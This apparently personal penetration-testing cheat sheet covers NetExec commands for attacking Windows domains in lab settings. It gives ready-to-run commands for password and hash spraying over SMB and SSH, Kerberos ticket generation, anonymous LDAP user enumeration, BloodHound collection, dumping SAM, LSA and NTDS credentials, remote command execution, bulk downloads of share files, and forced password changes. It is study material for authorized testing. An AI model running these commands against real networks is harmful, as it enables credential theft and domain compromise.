https://www.netexec.wiki

Note: Pwn3d! means code exec and RDP possible.

Spraying
	if you have a user list, always try spraying the list on both users and passwords.
## General Usage
NOTE: sometimes you HAVE to use kerberos (-k) to authenticate. This does not necessarily require a .ccache/.kirbi file.

```bash
#Collect creds as you enumerate a network and reuse them

# Spray domain users
nxc smb <target> -d domain -u users -H hashes --continue-on-success [-k]
nxc smb <target> -d domain -u users -p passwords --continue-on-success [-k]

# Spray for local users
nxc smb <target> -U users -P passwords --continue-on-success --local-auth
nxc smb <target> -U users -H hashes --continue-on-success --local-auth

# Generate TGT!!!
nxc smb <target> -d domain -u user -p pass -k --generate-tgt <Username>
KRB5CCNAME=<Username>.ccache    # Set as env variable
smbclient.py -k <FQDN>          # Auth example

	# Alternative: 
	 getTGT.py -dc-ip <ip> 'domain/user:pass'

# Spray subnet for user !!!
nxc smb 10.10.10.0/24 -u bob -p password123

# List Share
netexec smb 172.16.191.11 -u joe -d medtech.com -p "Flowers1" --shares

# List User info
--users # not always everyone...

# dont brute force -- 1 user and 1 pass per file (see user-pass combos section)
--no-bruteforce

# List pass-pol
--pass-pol # Useful for pass resets (See troubleshooting)

# Dump Creds
--sam
--las
--ntds

# Command execution
-x <command>

# Dump all readable files from smb share
nxc smb <stuff> -M spider_plus -o DOWNLOAD_FLAG=True
```

Spraying with user-pass combos
```bash
# Spray with user-pass COMBOS (list must be in user:pass format)
nxc smb <ip> -C (or --combo) <user_pass_list> --continue-on-success

# SSH is annoying and you have to have individual files that align on each line 
nxc ssh <ip> -u user_list.txt -p pass_list.txt --no-bruteforce
```

Enumerate users with `nxc ldap` -- if `ldapsearch` returns anything successful, do this!!!
```bash
# Users (if anon ldapsearch returns stuff, use blank user and pass fields...)
nxc ldap <ip> -u '' -p '' --users  # --users might miss some if they have no data

# FULL DUMP 
nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=*)" "" # parse very carefully
| grep -i 'member' # might reveal additional users but do NOT rely on only this...

# Description fields
nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password>' -M get-desc-users
```

## Collect Bloodhound data
```bash
# Bloodhound CE
nxc ldap '<dc_hostname.domain>(or IP address)' -d '<domain_name>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip_address (usually of DC)>

# Bloodhound legacy? use bloodhound-python

# proxychains
proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2 --dns-tcp
```

## Troubleshooting

STATUS_PASSWORD_MUST_CHANGE
```bash
# STATUS_PASSWORD_MUST_CHANGE means we must change the password before use
nxc smb <ip> -u <target> -p <pass> -M change-password -o NEWPASS='h@cK3d!!!!!!'
```